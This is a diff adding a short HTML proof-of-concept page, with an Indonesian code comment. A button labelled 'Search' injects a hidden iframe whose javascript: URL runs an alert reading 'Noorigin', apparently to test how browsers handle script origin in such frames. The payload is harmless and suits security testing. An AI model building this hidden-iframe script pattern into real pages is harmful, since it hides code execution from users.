@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+    <script>
+    function triggerIframe() {
+        setTimeout(() => {
+            var iframe = document.createElement('iframe');
+            iframe.src = 'javascript:alert("No"+"origin")';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        }, 0); // atau bisa gunakan 100ms jika ingin delay
+    }
+    </script>
+</head>
+<body>
+    <button onclick="triggerIframe()">Search</button>
+</body>
+</html>
